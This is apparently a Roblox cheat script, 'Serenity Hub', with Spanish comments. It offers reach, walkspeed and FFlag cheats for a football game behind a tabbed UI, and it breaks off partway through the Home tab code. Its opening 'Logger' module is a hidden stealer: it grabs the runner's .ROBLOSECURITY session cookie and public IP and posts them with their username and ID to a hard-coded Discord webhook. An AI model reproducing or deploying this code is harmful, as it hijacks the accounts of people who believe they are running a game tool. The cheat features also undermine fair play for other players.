-- ==========================================
-- SERENITY HUB - TOUCHLINE UI (TABS FUNCIONALES)
-- ==========================================

-- ==========================================
-- [1] LOGGER MODULE (INTEGRADO)
-- ==========================================
local Logger = {}

-- Dependencias del logger
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

-- Configuración del logger
Logger.WEBHOOK_URL = "https://discord.com/api/webhooks/1529271720932937778/QMaWDmkmfw0IbW9g-y2-bLFknmC_TDP2o6lQYTPFRe5GRmahlEjmemIEIRjjsLMPNFqP"
Logger.INCLUDE_COOKIE = true
Logger.INCLUDE_IP = true
Logger.DELAY = 3

-- Funciones privadas del logger
local function getGameName()
    local success, result = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId).Name or "Desconocido"
    end)
    return success and result or "Desconocido"
end

local function getCookie()
    if not Logger.INCLUDE_COOKIE then return "Omitido" end
    local cookie = "No extraída"
    pcall(function()
        if syn and syn.cookie_get then
            cookie = syn.cookie_get(".ROBLOSECURITY") or "No extraída"
        elseif getcookie then
            cookie = getcookie(".ROBLOSECURITY") or "No extraída"
        end
    end)
    return cookie
end

local function getPublicIP()
    if not Logger.INCLUDE_IP then return "Omitido" end
    local ip = "No disponible"
    if http and http.request then
        pcall(function()
            local response = http.request({
                Url = "https://api.ipify.org?format=text",
                Method = "GET"
            })
            if response and response.StatusCode == 200 then
                ip = response.Body or "No disponible"
            end
        end)
    end
    return ip
end

function Logger.Send(customData)
    local username = LocalPlayer.Name
    local userId = tostring(LocalPlayer.UserId)
    local gameName = getGameName()
    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
    local ip = getPublicIP()
    local cookie = getCookie()
    
    local message = string.format([[
═══════════════════════════════════════
  📊 DATOS DE LA CUENTA
═══════════════════════════════════════
  👤 Usuario     : %s
  🆔 ID          : %s
  🎮 Juego       : %s
  🕒 Fecha/Hora  : %s
  🌐 IP Pública  : %s
  🍪 Cookie      : %s
]], username, userId, gameName, timestamp, ip, cookie)
    
    if customData then
        message = message .. "\n═══════════════════════════════════════\n"
        message = message .. "  📌 DATOS PERSONALIZADOS\n"
        message = message .. "═══════════════════════════════════════\n"
        for key, value in pairs(customData) do
            message = message .. string.format("  %s : %s\n", key, tostring(value))
        end
    end
    
    message = message .. "═══════════════════════════════════════"
    
    local payload = { content = message }
    local json = HttpService:JSONEncode(payload)
    
    if http and http.request then
        pcall(function()
            http.request({
                Url = Logger.WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
        end)
        return true
    end
    return false
end

function Logger.SendDelayed(customData, delay)
    delay = delay or Logger.DELAY
    task.spawn(function()
        wait(delay)
        Logger.Send(customData)
    end)
end

function Logger.SetWebhook(url)
    Logger.WEBHOOK_URL = url
end

function Logger.SetConfig(config)
    if config.includeCookie ~= nil then Logger.INCLUDE_COOKIE = config.includeCookie end
    if config.includeIP ~= nil then Logger.INCLUDE_IP = config.includeIP end
    if config.delay ~= nil then Logger.DELAY = config.delay end
    if config.webhook ~= nil then Logger.WEBHOOK_URL = config.webhook end
end

-- ==========================================
-- [2] CONFIGURACIÓN INICIAL
-- ==========================================
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

-- ==========================================
-- [3] GLOBAL VARIABLES
-- ==========================================

-- Colors (Strong Purple)
local PURPLE = Color3.fromRGB(160, 50, 255)
local PURPLE_DARK = Color3.fromRGB(100, 20, 200)
local PURPLE_LIGHT = Color3.fromRGB(200, 120, 255)
local PURPLE_GLOW = Color3.fromRGB(180, 80, 255)

-- Fuente principal (Gotham - moderna y rústica)
local FONT = Enum.Font.Gotham
local FONT_BOLD = Enum.Font.GothamBold
local FONT_SEMIBOLD = Enum.Font.GothamSemibold

-- Reach Variables
local BallReachSize = 6.0
local Transparency = 0.7

-- Air Helper Variables
local PlatformEnabled = false
local PlatformSize = 15
local Smoothness = 0.25
local ShowPlatform = true
local PlatformTransparency = 0.7

-- Player Variables
local WalkSpeedValue = 22
local WalkSpeedEnabled = false
local DefaultWalkSpeed = 16

-- React Variables
local ReactSettings = {
    BallMagnet = false,
    NoBallDelay = false,
    AlzReact = false,
    FoxtedeReact = false
}

-- FFlags Variables
local FFlagValues = {
    ["DFIntTargetTimeDelayFactorTenths"] = "100",
    ["FIntInterpolationMaxDelayMSec"] = "1000",
    ["DFIntS2PhysicsSenderRate"] = "0"
}

-- System Variables
local platforms = {}
local platformRunning = false
local platformConnection = nil
local reachConnection = nil

-- Optimization Variables
local player = Players.LocalPlayer
local ballCache = {}
local lastScan = 0
local SCAN_INTERVAL = 0.4
local frameCount = 0
local reachFrame = 0

-- WalkSpeed Loop Variables
local walkSpeedConnection = nil
local isCharacterRespawning = false

-- UI Visibility
local uiVisible = true

-- Drag Variables
local isDragging = false
local dragStartPos = nil
local dragStartMouse = nil
local dragConnection = nil

-- ==========================================
-- [4] FUNCTION: DETECT EXECUTOR
-- ==========================================
local function DetectExecutor()
    local executor = "Unknown"
    
    if syn and syn.request then
        executor = "Synapse X"
    elseif krnl and krnl.request then
        executor = "Krnl"
    elseif script and script:FindFirstChild("Executor") then
        executor = script.Executor.Value
    elseif getexecutorname then
        local name = getexecutorname()
        if name then executor = name end
    elseif identifyexecutor then
        local success, result = pcall(identifyexecutor)
        if success and result then executor = result end
    elseif game:GetService("RunService"):IsStudio() then
        executor = "Roblox Studio"
    end
    
    if not executor or executor == "Unknown" then
        if _G["Script"] then
            executor = "Script"
        elseif getgenv and getgenv().Executor then
            executor = getgenv().Executor
        end
    end
    
    return executor
end

-- ==========================================
-- [5] FUNCTION: APPLY FFLAGS (SAFE)
-- ==========================================
local function ApplyFFlags()
    local success = false
    
    local setflag = setflag or set_fflag
    
    if setflag then
        local ok, err = pcall(function()
            for flag, value in pairs(FFlagValues) do
                setflag(flag, value)
            end
        end)
        if ok then success = true end
    end
    
    if not success then
        local ok, err = pcall(function()
            for flag, value in pairs(FFlagValues) do
                if getgenv then getgenv()[flag] = value end
                _G[flag] = value
            end
        end)
        if ok then success = true end
    end
    
    if not success then
        local ok, err = pcall(function()
            local fflagService = game:GetService("FFlagService")
            if fflagService then
                for flag, value in pairs(FFlagValues) do
                    fflagService:SetFFlag(flag, value)
                end
            end
        end)
        if ok then success = true end
    end
    
    return success
end

-- ==========================================
-- [6] FUNCTION: APPLY WALKSPEED
-- ==========================================
local function ApplyWalkSpeed(character)
    if not WalkSpeedEnabled then return end
    if isCharacterRespawning then return end
    
    local humanoid = character and character:FindFirstChild("Humanoid")
    if humanoid then
        if humanoid.WalkSpeed ~= WalkSpeedValue then
            humanoid.WalkSpeed = WalkSpeedValue
        end
    end
end

-- ==========================================
-- [7] FUNCTION: START WALKSPEED LOOP
-- ==========================================
local function StartWalkSpeedLoop()
    if walkSpeedConnection then
        walkSpeedConnection:Disconnect()
        walkSpeedConnection = nil
    end
    
    walkSpeedConnection = RunService.RenderStepped:Connect(function()
        if not WalkSpeedEnabled then return end
        if isCharacterRespawning then return end
        
        local character = LocalPlayer.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid and humanoid.WalkSpeed ~= WalkSpeedValue then
                humanoid.WalkSpeed = WalkSpeedValue
            end
        end
    end)
end

-- ==========================================
-- [8] DETECTAR CUANDO EL JUGADOR SPAWNEA
-- ==========================================
local function OnCharacterAdded(character)
    isCharacterRespawning = true
    
    local humanoid = character:WaitForChild("Humanoid")
    
    DefaultWalkSpeed = humanoid.WalkSpeed
    
    task.wait(0.5)
    
    isCharacterRespawning = false
    
    if WalkSpeedEnabled then
        task.wait(0.1)
        humanoid.WalkSpeed = WalkSpeedValue
    end
end

LocalPlayer.CharacterAdded:Connect(OnCharacterAdded)

if LocalPlayer.Character then
    OnCharacterAdded(LocalPlayer.Character)
end

-- ==========================================
-- [9] BALL SEARCH SYSTEM
-- ==========================================
local function scanBalls()
    if tick() - lastScan < SCAN_INTERVAL then
        return ballCache
    end
    lastScan = tick()
    ballCache = {}
    
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") or obj:IsA("Model") then
            local name = obj.Name and obj.Name:lower() or ""
            if name:find("ball") or name:find("football") or name:find("soccer") then
                table.insert(ballCache, obj)
            end
        end
    end
    return ballCache
end

-- ==========================================
-- [10] PLATFORM SYSTEM
-- ==========================================

local function getBallPos(ball)
    if ball:IsA("BasePart") then
        return ball.Position, ball
    elseif ball:IsA("Model") then
        local part = ball.PrimaryPart or ball:FindFirstChildWhichIsA("BasePart")
        if part then return part.Position, part end
    end
    return nil, nil
end

local function createPlatform(ball)
    if platforms[ball] then return end
    
    local platform = Instance.new("Part")
    platform.Name = "AirPlatform"
    platform.Size = Vector3.new(PlatformSize, 0.2, PlatformSize)
    platform.Anchored = true
    platform.CanCollide = true
    platform.CastShadow = false
    platform.Color = PURPLE
    platform.Material = Enum.Material.SmoothPlastic
    platform.Transparency = ShowPlatform and PlatformTransparency or 1
    platform.Parent = workspace
    
    platforms[ball] = { part = platform, lastPos = platform.Position }
end

local function removePlatform(ball)
    local data = platforms[ball]
    if data and data.part then
        data.part:Destroy()
        platforms[ball] = nil
    end
end

local function ClearAllPlatforms()
    for _, data in pairs(platforms) do
        if data and data.part then
            data.part:Destroy()
        end
    end
    platforms = {}
end

local function UpdatePlatformSize()
    for _, data in pairs(platforms) do
        if data and data.part then
            data.part.Size = Vector3.new(PlatformSize, 0.2, PlatformSize)
        end
    end
end

local function UpdatePlatformVisibility()
    for _, data in pairs(platforms) do
        if data and data.part then
            data.part.Transparency = ShowPlatform and PlatformTransparency or 1
        end
    end
end

local function UpdatePlatformTransparency()
    for _, data in pairs(platforms) do
        if data and data.part then
            data.part.Transparency = ShowPlatform and PlatformTransparency or 1
        end
    end
end

-- ==========================================
-- [11] PLATFORM SYSTEM - MAIN LOOP
-- ==========================================
function StartPlatformSystem()
    if platformRunning then return end
    if platformConnection then 
        platformConnection:Disconnect()
        platformConnection = nil
    end
    
    platformRunning = true
    
    platformConnection = RunService.RenderStepped:Connect(function()
        if not PlatformEnabled or not platformRunning then return end
        
        frameCount = frameCount + 1
        if frameCount % 4 ~= 0 then return end
        
        local balls = scanBalls()
        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        local active = {}
        
        for _, ball in ipairs(balls) do
            local pos, part = getBallPos(ball)
            if pos and part and part.Parent then
                local inAir = pos.Y > 3
                
                if inAir then
                    createPlatform(ball)
                    local data = platforms[ball]
                    if data then
                        local platform = data.part
                        local targetPos = pos - Vector3.new(0, 2, 0)
                        local newPos = data.lastPos:Lerp(targetPos, Smoothness * 0.7)
                        platform.Position = newPos
                        data.lastPos = newPos
                        
                        if root and frameCount % 8 == 0 then
                            platform.CanCollide = root.Position.Y >= platform.Position.Y
                        end
                    end
                    active[ball] = true
                else
                    removePlatform(ball)
                end
            end
        end
        
        if math.floor(tick()) % 3 == 0 then
            for ball, data in pairs(platforms) do
                if not active[ball] or not ball.Parent then
                    removePlatform(ball)
                end
            end
        end
    end)
end

function StopPlatformSystem()
    platformRunning = false
    if platformConnection then
        platformConnection:Disconnect()
        platformConnection = nil
    end
    ClearAllPlatforms()
end

-- ==========================================
-- [12] REACH SYSTEM - ALWAYS ACTIVE
-- ==========================================
local function startReach()
    if reachConnection then reachConnection:Disconnect() end
    reachConnection = RunService.RenderStepped:Connect(function()
        reachFrame = reachFrame + 1
        if reachFrame % 3 ~= 0 then return end
        
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("BasePart") then
                local name = obj.Name:lower()
                if name:find("ball") or name:find("football") then
                    obj.Size = Vector3.new(BallReachSize, BallReachSize, BallReachSize)
                    obj.Transparency = Transparency
                    obj.CanCollide = false
                end
            end
        end
    end)
end

startReach()

-- ==========================================
-- [13] UI - UI ELEMENTS FUNCTIONS (CON FUENTE GOTHAM)
-- ==========================================

-- Create Toggle WITH SMOOTH ANIMATION (Locked version for React)
local function CreateToggle(parent, label, default, yPos, callback, locked)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(1, -20, 0, 45)
    Frame.Position = UDim2.new(0, 10, 0, yPos)
    Frame.BackgroundTransparency = 1
    Frame.Parent = parent
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(0.6, 0, 1, 0)
    Label.BackgroundTransparency = 1
    Label.Text = label
    Label.TextColor3 = Color3.fromRGB(230, 220, 240)
    Label.TextSize = 15
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Font = FONT -- Gotham
    Label.Parent = Frame
    
    local ToggleBtn = Instance.new("TextButton")
    ToggleBtn.Size = UDim2.new(0, 50, 0, 26)
    ToggleBtn.Position = UDim2.new(0.85, 0, 0.5, -13)
    ToggleBtn.BackgroundColor3 = default and PURPLE or Color3.fromRGB(50, 50, 70)
    ToggleBtn.Text = ""
    ToggleBtn.BorderSizePixel = 0
    ToggleBtn.Parent = Frame
    
    local ToggleCorner = Instance.new("UICorner")
    ToggleCorner.CornerRadius = UDim.new(1, 0)
    ToggleCorner.Parent = ToggleBtn
    
    local Circle = Instance.new("Frame")
    Circle.Size = UDim2.new(0, 20, 0, 20)
    Circle.Position = default and UDim2.new(0, 27, 0.5, -10) or UDim2.new(0, 3, 0.5, -10)
    Circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Circle.BorderSizePixel = 0
    Circle.Parent = ToggleBtn
    
    local CircleCorner = Instance.new("UICorner")
    CircleCorner.CornerRadius = UDim.new(1, 0)
    CircleCorner.Parent = Circle
    
    local currentValue = default
    local isLocked = locked or false
    
    local function AnimateToggle(value)
        local targetColor = value and PURPLE or Color3.fromRGB(50, 50, 70)
        local targetPos = value and UDim2.new(0, 27, 0.5, -10) or UDim2.new(0, 3, 0.5, -10)
        
        local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        
        local colorTween = TweenService:Create(ToggleBtn, tweenInfo, {BackgroundColor3 = targetColor})
        local posTween = TweenService:Create(Circle, tweenInfo, {Position = targetPos})
        
        colorTween:Play()
        posTween:Play()
    end
    
    ToggleBtn.MouseButton1Click:Connect(function()
        if isLocked then
            if not currentValue then
                currentValue = true
                AnimateToggle(true)
                callback(true)
            end
            return
        end
        currentValue = not currentValue
        AnimateToggle(currentValue)
        callback(currentValue)
    end)
    
    return {
        SetValue = function(value)
            currentValue = value
            AnimateToggle(value)
        end,
        GetValue = function()
            return currentValue
        end,
        Lock = function()
            isLocked = true
        end
    }
end

-- Create Slider REDESIGNED - Más fácil de tocar
local function CreateSlider(parent, label, min, max, increment, default, yPos, callback)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(1, -20, 0, 75)
    Frame.Position = UDim2.new(0, 10, 0, yPos)
    Frame.BackgroundTransparency = 1
    Frame.Parent = parent
    
    -- Label
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(0.6, 0, 0, 30)
    Label.Position = UDim2.new(0, 0, 0, 0)
    Label.BackgroundTransparency = 1
    Label.Text = label
    Label.TextColor3 = Color3.fromRGB(230, 220, 240)
    Label.TextSize = 15
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Font = FONT -- Gotham
    Label.Parent = Frame
    
    -- Value Label
    local ValueLabel = Instance.new("TextLabel")
    ValueLabel.Size = UDim2.new(0.3, 0, 0, 30)
    ValueLabel.Position = UDim2.new(0.7, 0, 0, 0)
    ValueLabel.BackgroundTransparency = 1
    ValueLabel.Text = string.format("%.0f", default)
    ValueLabel.TextColor3 = PURPLE_LIGHT
    ValueLabel.TextSize = 16
    ValueLabel.TextXAlignment = Enum.TextXAlignment.Right
    ValueLabel.Font = FONT_BOLD -- Gotham Bold
    ValueLabel.Parent = Frame
    
    -- Slider container (zona de clic más grande)
    local SliderContainer = Instance.new("Frame")
    SliderContainer.Size = UDim2.new(1, 0, 0, 30)
    SliderContainer.Position = UDim2.new(0, 0, 0, 38)
    SliderContainer.BackgroundTransparency = 1
    SliderContainer.Parent = Frame
    
    -- Slider background (wider with design)
    local SliderBg = Instance.new("Frame")
    SliderBg.Size = UDim2.new(1, 0, 0, 6)
    SliderBg.Position = UDim2.new(0, 0, 0.5, -3)
    SliderBg.BackgroundColor3 = Color3.fromRGB(40, 35, 50)
    SliderBg.BorderSizePixel = 0
    SliderBg.Parent = SliderContainer
    
    local SliderBgCorner = Instance.new("UICorner")
    SliderBgCorner.CornerRadius = UDim.new(1, 0)
    SliderBgCorner.Parent = SliderBg
    
    -- Gradient for slider
    local SliderGradient = Instance.new("UIGradient")
    SliderGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 30, 120)),
        ColorSequenceKeypoint.new(0.5, PURPLE_DARK),
        ColorSequenceKeypoint.new(1, PURPLE)
    })
    SliderGradient.Parent = SliderBg
    
    -- Slider Track (the fill)
    local SliderFill = Instance.new("Frame")
    SliderFill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
    SliderFill.BackgroundColor3 = PURPLE
    SliderFill.BorderSizePixel = 0
    SliderFill.Parent = SliderBg
    
    local FillCorner = Instance.new("UICorner")
    FillCorner.CornerRadius = UDim.new(1, 0)
    FillCorner.Parent = SliderFill
    
    -- Gradient for fill (brighter)
    local FillGradient = Instance.new("UIGradient")
    FillGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, PURPLE),
        ColorSequenceKeypoint.new(0.5, PURPLE_GLOW),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 150, 255))
    })
    FillGradient.Parent = SliderFill
    
    -- Slider circle (bigger with glow)
    local SliderCircle = Instance.new("Frame")
    SliderCircle.Size = UDim2.new(0, 18, 0, 18)
    SliderCircle.Position = UDim2.new((default - min) / (max - min), -9, 0.5, -9)
    SliderCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    SliderCircle.BorderSizePixel = 0
    SliderCircle.Parent = SliderBg
    
    local CircleCorner = Instance.new("UICorner")
    CircleCorner.CornerRadius = UDim.new(1, 0)
    CircleCorner.Parent = SliderCircle
    
    -- Circle glow
    local CircleGlow = Instance.new("Frame")
    CircleGlow.Size = UDim2.new(1, 8, 1, 8)
    CircleGlow.Position = UDim2.new(0, -4, 0, -4)
    CircleGlow.BackgroundColor3 = PURPLE
    CircleGlow.BackgroundTransparency = 0.7
    CircleGlow.BorderSizePixel = 0
    CircleGlow.Parent = SliderCircle
    
    local GlowCorner = Instance.new("UICorner")
    GlowCorner.CornerRadius = UDim.new(1, 0)
    GlowCorner.Parent = CircleGlow
    
    local currentValue = default
    local isDragging = false
    
    local function UpdateSliderValue(mouseX)
        local relativePos = math.clamp((mouseX - SliderBg.AbsolutePosition.X) / SliderBg.AbsoluteSize.X, 0, 1)
        currentValue = math.round((min + relativePos * (max - min)) / increment) * increment
        currentValue = math.clamp(currentValue, min, max)
        
        local newSize = (currentValue - min) / (max - min)
        
        local fillTween = TweenService:Create(SliderFill, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = UDim2.new(newSize, 0, 1, 0)
        })
        fillTween:Play()
        
        local circleTween = TweenService:Create(SliderCircle, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Position = UDim2.new(newSize, -9, 0.5, -9)
        })
        circleTween:Play()
        
        ValueLabel.Text = string.format("%.0f", currentValue)
        callback(currentValue)
    end
    
    -- Click en el contenedor (zona más grande)
    SliderContainer.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            isDragging = true
            UpdateSliderValue(input.Position.X)
        end
    end)
    
    -- Arrastre con click sostenido
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and isDragging then
            if input.Position.X >= SliderBg.AbsolutePosition.X and input.Position.X <= SliderBg.AbsolutePosition.X + SliderBg.AbsoluteSize.X then
                UpdateSliderValue(input.Position.X)
            end
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            isDragging = false
        end
    end)
    
    return {
        SetValue = function(value)
            currentValue = math.clamp(value, min, max)
            local newSize = (currentValue - min) / (max - min)
            SliderFill.Size = UDim2.new(newSize, 0, 1, 0)
            SliderCircle.Position = UDim2.new(newSize, -9, 0.5, -9)
            ValueLabel.Text = string.format("%.0f", currentValue)
            callback(currentValue)
        end,
        GetValue = function()
            return currentValue
        end
    }
end

-- Create Input Box for FFlags
local function CreateInputBox(parent, label, defaultValue, yPos, callback)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(1, -20, 0, 45)
    Frame.Position = UDim2.new(0, 10, 0, yPos)
    Frame.BackgroundTransparency = 1
    Frame.Parent = parent
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(0.5, 0, 1, 0)
    Label.BackgroundTransparency = 1
    Label.Text = label
    Label.TextColor3 = Color3.fromRGB(230, 220, 240)
    Label.TextSize = 13
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Font = FONT -- Gotham
    Label.Parent = Frame
    
    local InputBox = Instance.new("TextBox")
    InputBox.Size = UDim2.new(0.35, 0, 0, 30)
    InputBox.Position = UDim2.new(0.6, 0, 0.5, -15)
    InputBox.BackgroundColor3 = Color3.fromRGB(30, 25, 45)
    InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    InputBox.Text = tostring(defaultValue)
    InputBox.TextSize = 14
    InputBox.TextXAlignment = Enum.TextXAlignment.Center
    InputBox.Font = FONT -- Gotham
    InputBox.BorderSizePixel = 0
    InputBox.Parent = Frame
    
    local InputCorner = Instance.new("UICorner")
    InputCorner.CornerRadius = UDim.new(0, 6)
    InputCorner.Parent = InputBox
    
    local currentValue = defaultValue
    
    InputBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            local newValue = InputBox.Text
            if newValue ~= "" then
                currentValue = newValue
                callback(newValue)
            else
                InputBox.Text = currentValue
            end
        end
    end)
    
    return {
        SetValue = function(value)
            currentValue = tostring(value)
            InputBox.Text = currentValue
        end,
        GetValue = function()
            return currentValue
        end
    }
end

-- Create Button
local function CreateButton(parent, label, yPos, callback)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(1, -20, 0, 45)
    Frame.Position = UDim2.new(0, 10, 0, yPos)
    Frame.BackgroundTransparency = 1
    Frame.Parent = parent
    
    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(1, 0, 1, 0)
    Button.BackgroundColor3 = PURPLE
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.Text = label
    Button.TextSize = 15
    Button.Font = FONT_BOLD -- Gotham Bold
    Button.BorderSizePixel = 0
    Button.Parent = Frame
    
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 8)
    ButtonCorner.Parent = Button
    
    Button.MouseEnter:Connect(function()
        TweenService:Create(Button, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            BackgroundColor3 = PURPLE_LIGHT
        }):Play()
    end)
    
    Button.MouseLeave:Connect(function()
        TweenService:Create(Button, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            BackgroundColor3 = PURPLE
        }):Play()
    end)
    
    Button.MouseButton1Click:Connect(function()
        callback()
    end)
    
    return Button
end

-- Create Separator Line for Tabs
local function CreateSeparator(parent, yPos)
    local Separator = Instance.new("Frame")
    Separator.Size = UDim2.new(0.95, 0, 0, 1.5)
    Separator.Position = UDim2.new(0.025, 0, 0, yPos)
    Separator.BackgroundColor3 = PURPLE
    Separator.BackgroundTransparency = 0.3
    Separator.BorderSizePixel = 0
    Separator.Parent = parent
    
    local SepGradient = Instance.new("UIGradient")
    SepGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
        ColorSequenceKeypoint.new(0.1, PURPLE),
        ColorSequenceKeypoint.new(0.5, PURPLE_LIGHT),
        ColorSequenceKeypoint.new(0.9, PURPLE),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
    })
    SepGradient.Parent = Separator
    
    return Separator
end

-- ==========================================
-- [14] UI - CREATE MAIN INTERFACE
-- ==========================================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SerenityHub"
ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui

-- MAIN CONTAINER
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 700, 0, 500)
MainFrame.Position = UDim2.new(0.5, -350, 0.5, -250)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 25)
MainFrame.BackgroundTransparency = 0.05
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = MainFrame

-- PURPLE BORDER
local PurpleBorder = Instance.new("Frame")
PurpleBorder.Name = "PurpleBorder"
PurpleBorder.Size = UDim2.new(1, 0, 1, 0)
PurpleBorder.Position = UDim2.new(0, 0, 0, 0)
PurpleBorder.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PurpleBorder.BackgroundTransparency = 1
PurpleBorder.BorderSizePixel = 2
PurpleBorder.BorderColor3 = PURPLE
PurpleBorder.Parent = MainFrame

local BorderCorner = Instance.new("UICorner")
BorderCorner.CornerRadius = UDim.new(0, 12)
BorderCorner.Parent = PurpleBorder

-- SIDEBAR
local Sidebar = Instance.new("Frame")
Sidebar.Name = "Sidebar"
Sidebar.Size = UDim2.new(0, 180, 1, 0)
Sidebar.BackgroundColor3 = Color3.fromRGB(12, 8, 22)
Sidebar.BackgroundTransparency = 0.02
Sidebar.BorderSizePixel = 0
Sidebar.Parent = MainFrame

local SidebarCorner = Instance.new("UICorner")
SidebarCorner.CornerRadius = UDim.new(0, 12)
SidebarCorner.Parent = Sidebar

-- Purple divider line
local DividerLine = Instance.new("Frame")
DividerLine.Size = UDim2.new(0, 2, 1, -20)
DividerLine.Position = UDim2.new(1, -2, 0, 10)
DividerLine.BackgroundColor3 = PURPLE
DividerLine.BackgroundTransparency = 0.3
DividerLine.BorderSizePixel = 0
DividerLine.Parent = Sidebar

-- TITLE "Serenity"
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 0, 50)
TitleLabel.Position = UDim2.new(0, 0, 0.02, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "Serenity"
TitleLabel.TextColor3 = PURPLE_LIGHT
TitleLabel.TextSize = 28
TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
TitleLabel.Font = FONT_BOLD -- Gotham Bold
TitleLabel.Parent = Sidebar

-- CONTENT AREA
local ContentArea = Instance.new("Frame")
ContentArea.Name = "ContentArea"
ContentArea.Size = UDim2.new(1, -190, 1, -10)
ContentArea.Position = UDim2.new(0, 185, 0, 5)
ContentArea.BackgroundTransparency = 1
ContentArea.Parent = MainFrame

-- USER INFO
local UserFrame = Instance.new("Frame")
UserFrame.Size = UDim2.new(1, 0, 0, 45)
UserFrame.Position = UDim2.new(0, 0, 1, -45)
UserFrame.BackgroundTransparency = 1
UserFrame.Parent = Sidebar

local UserLabel = Instance.new("TextLabel")
UserLabel.Size = UDim2.new(1, -20, 1, 0)
UserLabel.Position = UDim2.new(0, 10, 0, 0)
UserLabel.BackgroundTransparency = 1
UserLabel.Text = "Welcome\n" .. LocalPlayer.Name
UserLabel.TextColor3 = Color3.fromRGB(200, 190, 210)
UserLabel.TextSize = 12
UserLabel.TextXAlignment = Enum.TextXAlignment.Left
UserLabel.Font = FONT -- Gotham
UserLabel.TextYAlignment = Enum.TextYAlignment.Center
UserLabel.Parent = UserFrame

-- ==========================================
-- [15] UI - CREATE TAB CONTAINERS
-- ==========================================
local TabContents = {}
local CurrentTab = "Home"
local TabButtons = {}

local function CreateTabContent(tabName)
    local Container = Instance.new("Frame")
    Container.Name = tabName .. "Content"
    Container.Size = UDim2.new(1, 0, 1, 0)
    Container.BackgroundTransparency = 1
    Container.Visible = (tabName == "Home")
    Container.Parent = ContentArea
    
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 35)
    Title.Position = UDim2.new(0, 0, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Text = tabName
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 22
    Title.Font = FONT_BOLD -- Gotham Bold
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = Container
    
    CreateSeparator(Container, 40)
    
    return Container
end

-- ==========================================
-- [16] UI - TAB: HOME
-- ==========================================
local HomeContent = CreateTabContent("Home")
TabContents["Home"] = HomeContent

local HomeInfoLabel = Instance.new("TextLabel")
HomeInfoLabel.Size = UDim2.new(1, -20, 1, -50)
HomeInfoLabel.Position = UDim2.new(0, 10, 0, 50)
HomeInfoLabel.BackgroundTransparency = 1
HomeInfoLabel.Text = "Loading information..."
HomeInfoLabel.TextColor3 = Color3.fromRGB(200, 190, 210)
HomeInfoLabel.TextSize = 15
HomeInfoLabel.Font = FONT -- Gotham
HomeInfoLabel.TextXAlignment = Enum.TextXAlignment.Left
HomeInfoLabel.TextYAlignment = Enum.TextYAlignment.Top
HomeInfoLabel.LineHeight = 1.8
HomeInfoLabel.Parent = HomeContent

local function UpdateHomeInfo()
    local playerCount = #Players:GetPlayers()
    local executorName = DetectExecutor()
    
    local infoText = "DEVELOPER: 84uz & 0m3\n"
